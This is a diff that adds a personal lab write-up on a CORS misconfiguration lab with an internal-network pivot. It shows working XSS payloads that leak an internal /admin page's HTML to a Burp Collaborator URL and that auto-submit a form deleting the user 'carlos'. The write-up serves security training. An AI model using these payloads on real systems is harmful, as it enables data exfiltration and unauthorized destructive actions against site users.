@@ -1,0 +1,28 @@
+Lab #4 - CORS vulnerability with internal network pivot attack
+
+Target Goals:
+1. Use JS to locate an endpoint on the local network (192.168.0.0/24 port 8080)
+2. Exploit CORS misconfiguration to delete user Carlos.
+
+Analysis:
+
+Steps to complete the exercise:
+1. Scan the local network (192.168.0.0/24) for endpoints that have port 8080 open.
+	the burp collaborator would got you the host number and also the response of the page and from the response we noticed that it's a login a page and we can observe that there is a username and password parameters under the /login page
+Completed - http://192.168.0.181:8080
+
+2. Try to find an XSS vulnerability in the login page
+	here we are trying XSS vulnerability on the username parameter and if it works it will get back a connection on burp collaborator and the XSS payload was this one here:
+		xss_vector = '"><img src='+collaboratorURL+'?foundXSS=1>';
+Completed - username field vulnerable to XSS.
+
+3. Use the XSS vulnerability in order to access an authenticated page.
+	now here we know that the username is vulnerable to XSS vulnerability, so what we can do is guessing pages like /admin and then if it exists on the server so it would retrieves the response to US on the burp collaborator to see it what is contains , so the payload of XSS would be something like this:
+		xss_vector = '"><iframe src=/admin onload="new Image().src=\''+collaboratorURL+'?code=\'+encodeURIComponent(this.contentWindow.document.body.innerHTML)">';
+	BAAAAAAAM it works, so now we know the response of the /admin page and we were able to know that in order to delete users there is a form that takes the username and csrf token to delete that user, now it's so far so good!
+Completed - accessed the admin page.
+
+4. Use XSS vulnerability to delete the Carlos user. 
+	now what we can do is accessing the /admin page and give the carlos username to the form and then submit it, so yeah the XSS Payload would look something like this:
+		xss_vector = '"><iframe src=/admin onload="var f=this.contentWindow.document.forms[0]; if(f.username)f.username.value=\'carlos\',f.submit()">';
+Completed - Carlos username Deleted!
